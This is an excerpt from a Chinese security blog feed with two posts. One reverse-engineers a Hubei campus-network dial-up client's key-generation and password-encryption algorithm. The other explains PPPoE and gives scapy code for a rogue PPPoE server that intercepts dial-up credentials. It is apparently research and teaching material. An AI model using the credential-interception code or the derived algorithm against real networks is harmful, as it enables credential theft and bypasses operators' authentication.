class="line">    p_HbKeyGa = &amp;hbKeyGa;</span><br><span class="line">    pMem_64_a = &amp;mem_64_a;</span><br><span class="line">    p_HbKeyGa += <span class="built_in">strlen</span>(p_HbKeyGa);</span><br><span class="line">    lenHbKeyGa = ++p_HbKeyGa - &amp;mem_64_a;</span><br><span class="line">    len_HbKeyGa = p_HbKeyGa - &amp;mem_64_a;</span><br><span class="line">    <span class="keyword">while</span> ( temp1 &lt; len_HbKeyGa )               <span class="comment">// 把 HbKeyGa 里面的小写字母全替换为大写</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;hbKeyGa + temp1) &gt;= <span class="number">97</span> &amp;&amp; *(&amp;hbKeyGa + temp1) &lt;= <span class="number">122</span> )</span><br><span class="line">        *(&amp;hbKeyGa + temp1) -= <span class="number">32</span>;</span><br><span class="line">      ++temp1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    temp2 = <span class="number">0</span>;</span><br><span class="line">    p_HbKeyGb = &amp;hbKeyGb;</span><br><span class="line">    pMem_64_b = &amp;mem_64_b;</span><br><span class="line">    p_HbKeyGb += <span class="built_in">strlen</span>(p_HbKeyGb);</span><br><span class="line">    lenHbKeyGb = ++p_HbKeyGb - &amp;mem_64_b;</span><br><span class="line">    len_HbKeyGb = p_HbKeyGb - &amp;mem_64_b;</span><br><span class="line">    <span class="keyword">while</span> ( temp2 &lt; len_HbKeyGb )               <span class="comment">// 把 HbKeyGb 里面的小写字母全替换为大写</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;hbKeyGb + temp2) &gt;= <span class="number">97</span> &amp;&amp; *(&amp;hbKeyGb + temp2) &lt;= <span class="number">122</span> )</span><br><span class="line">        *(&amp;hbKeyGb + temp2) -= <span class="number">32</span>;</span><br><span class="line">      ++temp2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  pHbKeyGa = &amp;hbKeyGa;</span><br><span class="line">  pHbKeyGb = &amp;hbKeyGb;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] sga: %s"</span>, &amp;hbKeyGa);</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] sgb: %s"</span>, pHbKeyGb);</span><br><span class="line">  hbKey = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v90, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( pHbKeyGb[<span class="number">9</span>] % <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    index1 = <span class="number">0</span>;</span><br><span class="line">    index2 = <span class="number">0</span>;</span><br><span class="line">    index3 = <span class="number">63</span>;</span><br><span class="line">    <span class="keyword">while</span> ( index1 &lt; <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;hbKey + index1++) = pHbKeyGa[index2++];</span><br><span class="line">      *(&amp;hbKey + index1++) = pHbKeyGb[index3--];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    index4 = <span class="number">0</span>;</span><br><span class="line">    index5 = <span class="number">63</span>;</span><br><span class="line">    index6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( index4 &lt; <span class="number">128</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;hbKey + index4++) = pHbKeyGa[index5--];</span><br><span class="line">      *(&amp;hbKey + index4++) = pHbKeyGb[index6++];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"[HBKEY] key: %s"</span>, &amp;hbKey);<span class="comment">// hbKey = &amp;"115e9d6643Fd6c391a32E6298dA8D70025Ae9269473c1053AdDc9dAa47Ec6f4092658912C89d9aB83644D6D32c0e898b2e2bCaF8B1E1F06d025dF5E184040654"</span></span><br><span class="line">  sub_40EC40((<span class="keyword">void</span> *)a2, &amp;hbKey);</span><br><span class="line">  v41 |= <span class="number">1u</span>;</span><br><span class="line">  v146 = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;a3);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的就是 AidcRes.generateKey 的整个流程，这个坑多并且复杂，简要说一下，具体看代码（b_Username_MonthDay 代指 ‘b177111122220517’，不再赘述）</p><ol><li>算出 b_Username_MonthDay，username_b_MonthDay，username_MonthDay_b，monthDay_Username_b 四个东西的 md5</li><li>根据 d5_b_Username_MonthDay[1] 的 ascii的奇偶性，重排四个 md5 的顺序并复制给四个变量，分别为 md5_1，md5_2，md5_3，md5_4，</li><li>此时会用到第二步的四个变量，根据他们的特定位来计算得出 hbkey_ga 与 hbkey_gb 的值<ul><li>根据 <code>md5_1_pLus3remainder4 = *(char *)(md5_1 + 3) % 4;</code> 这步的值取 md5_1 和 md5_2 排列算出 hbkey_ga</li><li>根据 <code>md5_4_plus5remainer4 = *((char *)md5_4 + 5) % 4;</code> 这步的值取 md5_3 和 md5_4 排列算出 hbkey_gb</li></ul></li><li>根据 hbkey_gb[7] 的 ascii，如果奇数就把 hbkey_ga 中的字母都大写，偶数就把 hbkey_gb 中的字母都大写</li><li>根据 hbkey_gb[9] 的 ascii 的奇偶性对 hbkey_ga 与 hbkey_gb 的值用简单算法进行重排，得到真实的 hbkey</li></ol><p>这就是上面所有代码的大致流程，代码中我也有大量注释，大家可以看看。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个难点在分析算法上面，分析算法主要还是要靠动态调试，过程中遇到了很多很难的地方，参数和函数的重命名主要还是靠动态调试，<br>然后去猜测它的作用进行重命名。  </p><p>这些文件我都保存了分析记录，大家可以跟着看看，总结如下</p><p>AidcComm.idb 看导出表可以看出是干嘛的，直接点进GetPWD即可看到我的分析<br>AidcRes.idb 里面也有我的分析，具体查看我改过的函数名 generateKey，然后 x 一下看调用地方<br>x32dbg_AidcRes.dd32 为我在用 x32dbg 分析AidcRes.exe的时候的记录，有一些我改过的函数名以及简要分析<br>简单的分析流程为 bp LoadLibrary，断到 AidcComm.dll，然后具体看eax和栈的变化，找到加密函数，再一层一层分析。</p><p>建议 ida 与 x32dbg 结合分析，最好起个 pppoe 服务器拦截账号密码协助分析，见我上一篇文章 <a href="https://www.anquanke.com/post/id/178484" target="_blank" rel="noopener">PPPoE中间人拦截以及校园网突破漫谈</a>中的代码。</p><p>调用流程为<br>AidcRes.generateKey(分析大头) –&gt; AidcComm.GetRegularAccount –&gt; AidcComm.GetPWD –&gt; AidcComm.encryptPwdWithKey(分析大头，注意里面有个地方 f5 显示不出来，就是把一个key中的字母全大写的那部分，请结合汇编分析)</p><p>AidcRes.generateKey大致流程，这个坑多并且复杂，简要说一下，具体看代码<br>（b_Username_MonthDay 代指 ‘b177111122220517’，不再赘述）</p><ol><li>算出 b_Username_MonthDay，username_b_MonthDay，username_MonthDay_b，monthDay_Username_b 四个东西的 md5</li><li>根据 d5_b_Username_MonthDay[1] 的 ascii的奇偶性，重排四个 md5 的顺序并复制给四个变量</li><li>此时会用到第二步的四个变量，根据他们的特定位来计算得出 hbkey_ga 与 hbkey_gb 的值</li><li>根据 hbkey_gb[7] 的 ascii，如果奇数就把 hbkey_ga 中的字母都大写，偶数就把 hbkey_gb 中的字母都大写</li><li>根据 hbkey_gb[9] 的 ascii 的奇偶性对 hbkey_ga 与 hbkey_gb 的值用简单算法进行重排，得到真实的 hbkey</li></ol><p>AidcComm.encryptPwdWithKey大致流程</p><ol><li>password 用 key RC4 一下得到 A</li><li>把 A md5 一下得到 B，如果第 11 位为奇数，取 B 的前 16 位，偶数就后 16 位，得到 C</li><li>C 再用 key RC4 一下得到 D</li><li>D 再 md5 一下，取 [8:24]得到 E</li><li>E[今天几号日期 % 16] 替换为 ‘b’ 得到最后的密码</li></ol><p>为了防止被商业利用，就不公开逆向得出的加密脚本了，喜欢折腾校园网的可以自行根据本文摸索。</p><h2 id="分析文件打包"><a href="#分析文件打包" class="headerlink" title="分析文件打包"></a>分析文件打包</h2><ul><li><a href="https://www.lanzous.com/i48toqb" target="_blank" rel="noopener">飞Young宽带_带分析.7z</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;湖北校园网PC端拨号算法逆向&quot;&gt;&lt;a href=&quot;#湖北校园网PC端拨号算法逆向&quot; class=&quot;headerlink&quot; title=&quot;湖北校园网PC端拨号算法逆向&quot;&gt;&lt;/a&gt;湖北校园网PC端拨号算法逆向&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上一文 &lt;a href=&quot;https://www.anquanke.com/post/id/178484&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PPPoE中间人拦截以及校园网突破漫谈&lt;/a&gt;我们谈到使用 PPPoE 拦截来获取真实的账号密码。&lt;br&gt;在这个的基础上，我对我们湖北的客户端进行了逆向，得到了拨号加密算法。&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="网络协议" scheme="http://hacktech.cn/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>PPPoE中间人拦截以及校园网突破漫谈</title>
    <link href="http://hacktech.cn/2019/05/12/pppoe-server-mitm.html"/>
    <id>http://hacktech.cn/2019/05/12/pppoe-server-mitm.html</id>
    <published>2019-05-12T08:16:12.000Z</published>
    <updated>2019-11-13T05:11:10.980Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于<a href="https://www.anquanke.com/post/id/178484" target="_blank" rel="noopener">PPPoE中间人拦截以及校园网突破漫谈</a>，转载请注明出处。</p></blockquote><h1 id="PPPoE中间人拦截以及校园网突破漫谈"><a href="#PPPoE中间人拦截以及校园网突破漫谈" class="headerlink" title="PPPoE中间人拦截以及校园网突破漫谈"></a>PPPoE中间人拦截以及校园网突破漫谈</h1><p>校园生活快结束了，之前还有点未完成的想法，趁着这两天有兴趣搞搞。</p><p>此文面向大众是那种在校园内苦受拨号客户端的毒害，但是又想自己动手折腾下的。</p><a id="more"></a><h2 id="一些我知道的办法"><a href="#一些我知道的办法" class="headerlink" title="一些我知道的办法"></a>一些我知道的办法</h2><p>目前主要的方法可以可以分为移动端和电脑客户端。</p><h3 id="移动端"><a href="#移动端" class="headerlink" title="移动端"></a>移动端</h3><p>移动端基本是基于 http 的 portal 认证，这个解决方法比较多，但依据剧情情况而定。</p><p>比如拨号后克隆 mac 到路由器，还有基于这个方法的衍生方法，比如拨号前交换机，登陆后改路由器并复制 mac 到路由器。还有比如虚拟路由转发。</p><p>这些其实都是利用的检测的原理，按道理说，portal 并不像 PPPoE 那样，PPPoE 中间是不允许有路由节点的，因为在 PADI 广播包是本地广播，本地广播路由器不会进行转发，所以并不能找到一个目的 PPPoE Server。</p><p>这里扯远了，关于 PPPoE 下面再说。</p><p>我们接着看看 portal，这个是基于 HTTP 的，大体上的流程是</p><ol><li>访问一个 http 网站，比如 <a href="http://www.qq.com，因为网关会拦截" target="_blank" rel="noopener">http://www.qq.com，因为网关会拦截</a> http 请求然后重定向到一个形如 <a href="http://58.53.199.144:8001/?userip=100.64.224.167&amp;wlanacname=&amp;nasip=58.50.189.124&amp;usermac=1c-87-2c-77-77-9c" target="_blank" rel="noopener">http://58.53.199.144:8001/?userip=100.64.224.167&amp;wlanacname=&amp;nasip=58.50.189.124&amp;usermac=1c-87-2c-77-77-9c</a><br>的网址。</li><li>此时 app 会解析信息，比如 ip，mac。检测的地方就是在这里，比如检测你的手机 ip 是否和 userip 相同，加入你在路由器下，你的 ip 应该是形如 192.168.x.x 的地址，你的路由器的 wan ip 才是<br>和 userip 相同，还可能会进行比如 mac 判断，还可能检查 arp 表，至于这两样是怎样检测的我按下不表，总而言之，这里通不过检测，app 就判定你的网络环境不对。</li><li>然后 app 会将账号或密码进行加密，然后 post 到认证服务器，认证通过后，你这个 ip 就可以上网了。</li></ol><p>先说说为什么克隆 mac 有用，因为认证服务器那边是根据 mac 判定的，相同的 mac 在短时间内会获取到同样的 ip，并且短暂时间的断网也是允许的。其他衍生方法原理类似。</p><p>再来说说还有哪些办法，这些办法可能并没有之前的好操作。</p><p>比如 hook 判定函数</p><p>还有比如改 Response（这个办法是前阵子的思路，还没实践是否可行，既然判断参数取自响应包，那么我们应该能想到这个）</p><p>我前阵子用的比较多的其实是直接逆向 app 获取加密流程然后自写协议，但是现在看来可能是最费时费力的一种了，不过有一种好处，一个产品大概率是不会换加密算法的，顶多可能改改密钥，截取加密后的某一段。</p><p>这些大致上就是我所知道的几种移动端上面的方法了。</p><h3 id="电脑端"><a href="#电脑端" class="headerlink" title="电脑端"></a>电脑端</h3><p>电脑端方面老陈的文章已经写的很全面了，见 <a href="https://blog.sunflyer.cn/archives/460" target="_blank" rel="noopener">How To : 从Netkeeper 4.X客户端获取真实账号</a></p><p>这里面提到了我们可以下手的三个方面</p><ol><li>客户端本身</li></ol><p>比如 hook RasDialW api 和 CE 暴搜。</p><p>但是就如文章中所说，加了保护，可能是自行实现 peloader 也说不定，反正就是相当于没走系统的 api，而是自行搞了一份来进行拨号，这样就没办法通过 hook 系统 api 来获取了。另外暴搜内存也有局限。</p><p>拿我们湖北的举例子，湖北的客户端是动态加载一个 dll 来进行账号密码加密，但是这个过程很快，这个客户端主要的操作都貌似是在 dll 中完成，这里我说的快是指，他加载 dll 完成加密然后可能<br>又调用了它的其他 dll 拨号后，只要一个dll完成了它的“使命”，它会立刻卸载，导致我们通过 CE 手动暴搜内存几乎不可能（这里可能我写的有谬误，不过就我分析湖北的客户端来说感觉是这样）</p><ol start="2"><li>系统层面</li></ol><p>这个就如文章中提到的事件日志相关的东西</p><ol start="3"><li>中间人</li></ol><p>根据 PPPoE 协议的流程，我们完全可以自己搞一个 server 来进行拦截。</p><p>下面我们将详细了解这个，以及能够自己动手实现一个简单的 PPPoE Server。</p><h2 id="PPPoE-协议流程"><a href="#PPPoE-协议流程" class="headerlink" title="PPPoE 协议流程"></a>PPPoE 协议流程</h2><p>PPPoE 是一个二层协议，工作在链路层。</p><p>PPPoE 主要分为两个阶段，一个是发现阶段，我的理解就是两台机器建立起点对点的联系，第二个是会话阶段，这个阶段主要是配置确认，然后开始验证账号密码。</p><p>至于后面的分配 ip 的确定我们按下不表，因为此文主要关注的是拦截。</p><p>PPPoE 具体可分为以下阶段</p><ol><li>PPPoE发现阶段(Discovery)<ul><li>主机广播发起分组（PADI）</li><li>有效发现提供包分组（PADO）</li><li>有效发现请求分组（PADR）</li><li>有效发现会话确认（PADS）</li></ul></li><li>PPPoE会话阶段(Session)<ul><li>LCP协议请求确认配置(LCP-Config-Req)</li><li>LCP协议确认配置(LCP-Config-Ack)</li><li>PAP或CHAP验证账号密码</li></ul></li></ol><p>验证通过后开始进行一些后续的分配 ip 以及其他操作。</p><h2 id="PPPoE-发现阶段"><a href="#PPPoE-发现阶段" class="headerlink" title="PPPoE 发现阶段"></a>PPPoE 发现阶段</h2><h3 id="PADI"><a href="#PADI" class="headerlink" title="PADI"></a>PADI</h3><p>PADI 是一个广播包，发往 ff:ff:ff:ff:ff:ff 的广播地址，然后这个广播包会在本地网络进行广播。</p><p>它的 CODE 字段值为 0×09，SESSION-ID（会话ID）字段值为 0×0000。</p><p>PADI 分组必须至少包含一个 Host-Uniq，Host-Uniq为主机唯一标识，类似于PPP数据报文中的标识域，主要是用来匹配发送和接收端的。因为对于广播式的网络中可能会同时存在很多个PPPoE的数据报文。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PADI_TIM_20190512202318.png" alt=""></p><p>因为此时发的是广播包，那么我们只需要本机搭建一个 Server 对 PADI 进行响应，就可以开始我们的中间人作业了。</p><p>具体流程就是监听网卡，然后过滤 CODE 字段值为 0×09 的包然后进行响应即可。</p><p>因为其中的 Host-Uniq 字段在后续的请求中都需要，我们写一个函数把这个字段值揪出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#寻找客户端发送的Host-Uniq</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padi_find_hostuniq</span><span class="params">(self, payload)</span>:</span></span><br><span class="line">    _key = <span class="string">b'\x01\x03'</span></span><br><span class="line">    payload = bytes(payload)</span><br><span class="line">    <span class="keyword">if</span> _key <span class="keyword">in</span> payload:</span><br><span class="line">        _nIdx = payload.index(_key)</span><br><span class="line">        _nLen = struct.unpack(<span class="string">"!H"</span>, payload[_nIdx + <span class="number">2</span>:_nIdx + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        _nData = payload[_nIdx + <span class="number">2</span>:_nIdx + <span class="number">4</span> + _nLen]</span><br><span class="line">        <span class="keyword">return</span> _key + _nData</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>需要传入的是一个 Packet.payload，payload 是除去链路层的其他数据，在这里面具体就是 PPPoED 下面的数据</p><h3 id="PADO"><a href="#PADO" class="headerlink" title="PADO"></a>PADO</h3><p>当一个接入集中器（Server）接收到一个 PADI 包以后，就需要进行响应，发出 PADO 包了。</p><p>PADO 包的 CODE 字段值为 0×07，SESSION-ID 字段值仍为 0×0000。</p><p>PADO分组必须包含一个接入集中器名称类型的标签（此处的标签类型字段值为 akkuman），其实就是一个名字，你想填什么都可以。</p><p>并且需要包含前面 PADI 包中的 Host-Uniq 字段，这个字段在 PPPoE 的发现阶段都是必要的。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PADO_TIM_20190512203433.png" alt=""></p><p>在载荷中可能有多个 tag，他们的格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          TAG_TYPE             |        TAG_LENGTH             |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          TAG_VALUE ...                                        ~</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>可以看出，标记的封装格式采用的是大家所熟知的TLV结构，也即是（类型+长度+数据）。标记的类型域为2个字节，各个标记的类型所代表的含义具体可以查看 <a href="https://datatracker.ietf.org/doc/rfc2516/" target="_blank" rel="noopener">RFC 2516</a> 或 <a href="https://datatracker.ietf.org/doc/rfc2516/" target="_blank" rel="noopener">PPPoE帧格式</a></p><p>这里的 0x0103 即代表 Host-Uniq，是主机唯一标识，作用在上文已经提及。</p><p>那我们可以根据这个要求写一个发送 PADO 包的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#发送PADO回执包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_pado_packet</span><span class="params">(self, pkt)</span>:</span></span><br><span class="line">    <span class="comment"># 寻找客户端的Host_Uniq</span></span><br><span class="line">    _host_Uniq = self.padi_find_hostuniq(pkt.payload)</span><br><span class="line">    _payload = <span class="string">b'\x01\x02\x00\x07akkuman\x01\x01\x00\x00'</span></span><br><span class="line">    <span class="keyword">if</span> _host_Uniq:</span><br><span class="line">        _payload += _host_Uniq</span><br><span class="line">    <span class="comment"># PADO 回执包的 sessoinid 为 0x0000</span></span><br><span class="line">    pkt.sessionid =  getattr(pkt, <span class="string">'sessionid'</span>, <span class="number">0x0000</span>)</span><br><span class="line">    sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=<span class="number">0x8863</span>) / PPPoED(version=<span class="number">1</span>, type=<span class="number">1</span>, code=<span class="number">0x07</span>, sessionid=pkt.sessionid, len=len(_payload)) / _payload</span><br><span class="line">    scapy.sendp(sendpkt)</span><br></pre></td></tr></table></figure><p>其中的 pkt 是接收到的 PADI 数据包。</p><p>上面的 _payload 中的 \x01\x02 代表是 AC-Name 字段，\x00\x07 是后面的 akkuman 的长度。\x01\x01 是代表 Service-Name 字段，一般为空，所以我们这里直接填 \x00\x00。下文不再赘述。</p><p>其中的源 mac 地址和目标 mac 地址我们需要改改。</p><p>然后加上 Host-Uniq 字段，封装成包发出去，注意这里的 type=0x8863 是代表发现阶段，0x8864 是会话阶段。</p><p>至于这个是怎么封装起来的，这个是 scapy 库的语法，Ether 代表链路层，剩下的依此大家参照图即可理解，最后的 _payload 代表接上一段原始数据，一般就是 bytes。</p><h3 id="PADR"><a href="#PADR" class="headerlink" title="PADR"></a>PADR</h3><p>因为 PADI 包是广播的，所以客户端有可能收到不同的接入集中器多个的 PADO 响应包，客户端应该基于 AC-Name 和可以提供的服务（这个参见 RFC2516）从中选择一个合适的接入集中器。</p><p>然后客户端就发送 PADR 包到自己选择的接入集中器（将目标 mac 改成 PADO 包中的源 mac 即可），其中 CODE 字段为 0×19，SESSION_ID 字段值仍为 0×0000。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PADR_TIM_20190512205952.png" alt=""></p><h3 id="PADS"><a href="#PADS" class="headerlink" title="PADS"></a>PADS</h3><p>当接入集中器收到一个 PADR 包以后，就要准备开始一个 PPP 会话了。</p><p>在这个阶段，接入集中器会为接下来的 PPPoE 会话生成一个独一无二的 SESSION_ID，然后组装起来进行发送。其中 CODE 字段值为 0×65 。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PADS_TIM_20190512210604.png" alt=""></p><p>根据此我们可以写出一个发送 PADS 包的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#发送PADS回执包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_pads_packet</span><span class="params">(self, pkt)</span>:</span></span><br><span class="line">    <span class="comment">#寻找客户端的Host_Uniq</span></span><br><span class="line">    _host_Uniq = self.padi_find_hostuniq(pkt.payload)</span><br><span class="line">    _payload = <span class="string">b'\x01\x01\x00\x00'</span></span><br><span class="line">    <span class="keyword">if</span> _host_Uniq:</span><br><span class="line">        _payload += _host_Uniq</span><br><span class="line"></span><br><span class="line">    pkt.sessionid =  SESSION_ID</span><br><span class="line">    sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=<span class="number">0x8863</span>) / PPPoED(version=<span class="number">1</span>, type=<span class="number">1</span>, code=<span class="number">0x65</span>, sessionid=pkt.sessionid, len=len(_payload)) / _payload</span><br><span class="line">    scapy.sendp(sendpkt)</span><br></pre></td></tr></table></figure><p>其中的 pkt 为接收到的 PADR 数据包。</p><p>此时发现阶段就已经完成了，接下来就是进行 PPPoE 的会话阶段了。</p><h2 id="PPPoE-会话阶段"><a href="#PPPoE-会话阶段" class="headerlink" title="PPPoE 会话阶段"></a>PPPoE 会话阶段</h2><p>PPPoE 会话阶段的抓包并没有那么明显的特征，可能你在不同的时间看到的包的顺序都不太一样。</p><p>在此阶段的 Type 为 0x8864，代表 PPPoES，即会话阶段。</p><h3 id="LCP链路配置建立"><a href="#LCP链路配置建立" class="headerlink" title="LCP链路配置建立"></a>LCP链路配置建立</h3><p>一个典型的 LCP Request 如下图所示。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/LCP_REQ_TIM_20190512211932.png" alt=""></p><p>Protocol：决定了后面的载荷包含的是什么样的协议报文，类似以太帧的类型字段，是用以区分载荷送给哪个上层协议处理。收下为常见协议号：</p><ul><li>0xC021: LCP报文</li><li>0xC023: Password Authentication Protocol （PAP）</li><li>0xC223: Challenge Handshake Authentication Protocol （CHAP）</li><li>0x8021: IPCP报文，它是NCP协议的一种 （用来协商分配 ip）</li><li>0x0021: IP报文</li></ul><p>LCP(Link Control Protocol) 是链路控制协议，是 PPP 协议的一个成员协议，PPP 协议在 LCP 阶段默认不做认证协商，LCP 的认证只作为一个可选的参数。</p><p>接入集中器和客户端双方通过交互LCP配置报文来协商数据链路。</p><p>协商内容包括验证方式、最大接收单元 MRU、魔术字（Magic Number）等选项。<br>在此阶段 LCP 的状态机发生两次改变，进入会话阶段后，检测到链路可用，则物理层会向链路层发送一个 UP 事件，链路层收到该事件后，会将LCP的状态机从当前状态改变为 Request-Sent（请求发送）状态。<br>LCP 开始发送 Config-Request 报文（即上图中 LCP 下面的 CODE 字段，为 1 代表 Config-Request）来协商数据链路，无论哪一端接收到了 Config-Ack 报文（LCP 的 CODE 字段为 2）时， LCP的状态机又要发生改变，从当前状态改变为 Opened 状态，进入 Opened 状态后收到 Config-Ack 报文的一方则完成了当前阶段，应该向下一个阶段跃迁，下一个阶段可能是 Authentication（如 PAP 或 CHAP），也可能是 Network Layer Protocol（NLP）。<br>同理可知，另一端也是一样的，但须注意的一点是在链路配置阶段双方是链路配置操作过程是相互独立的。</p><p>如果配置了验证，将进入Authentication阶段，CHAP 或 PAP 验证。如果没有配置验证，则直接进入 Network Layer Protocol 阶段，即开始分配 ip 等操作。</p><p>这是在网上找的 LCP 报文格式，其实更建议大家配合 wireshark 抓包来看。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/LCP_Packet_format.png" alt=""></p><p>上面我的提到了 LCP 中的 code，LCP协议使用Code字段区分11种报文格式，详细的表见下，平时我们用的比较多的就是 1 和 2</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/LCP_code_table.png" alt=""></p><ul><li><p>Identifier：标识域的值表示进行协商报文的匹配关系。 标识域目的是用来匹配请求和响应报文。当对端接收到该配置请求报文后，无论使用何种报文回应对方，但必须要求回应报文中的ID要与接收报文中的ID一致。换句话说，在一个协商数据链路阶段，这个字段的值都是一样的，在本次我的例子抓包中为 1。</p></li><li><p>Length：它是代码域Code、标志域Identified、长度域Length和数据域Data四个域长度的总和。</p></li></ul><p>下面是一张图，用来说明 req 与 ack 的交互。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/Link_Establishment.jpg" alt=""></p><p>从这张图中可以相信不难理解之前的话了，A 和 B 初始都在 Request-Sent（请求发送）状态。<br>然后两者都开始发送 Config-Request 报文，只有 A 和 B 都收到了对方的 Config-Ack 报文。<br>才标志着 LCP 状态变迁的完成，可以向下一个阶段 NLP 或者 Autiontication（PAP 或 CHAP）跃迁。</p><p>在协商数据链路配置阶段，点对点（PPPoE是点对点协议）双方至少都发了一个 Config-Request 报文，该报文中包含了发送方对于所有的配置参数的期望值。</p><p>关于在协商数据链路配置阶段可能出现的报文，我给大家找了一页 PPT</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/LCP_Configuration_Packet_20190512220257.png" alt=""></p><ul><li>如果对方对于自己发送的 Config-Request 回应了一个 Config-Ack，则说明对方能识别所有选项，并且全部能够被接受；</li><li>如果对方对于自己发送的 Config-Request 回应了一个 Config-Nak，则说明对方能识别所有选项，但只有部分能够被接受；</li><li>如果对方对于自己发送的 Config-Request 回应了一个 Config-Rej，则说明对方有部分选项不能被识别，或者不能被接受；</li><li>如果双方最终收到对方发送的 Config-Ack 报文，则说明对方对于自己提出的配置参数的协商已经取得了一致，这同时也标志着链路建立顺利结束。</li></ul><p>如果接收到了 Config-Nak 或者 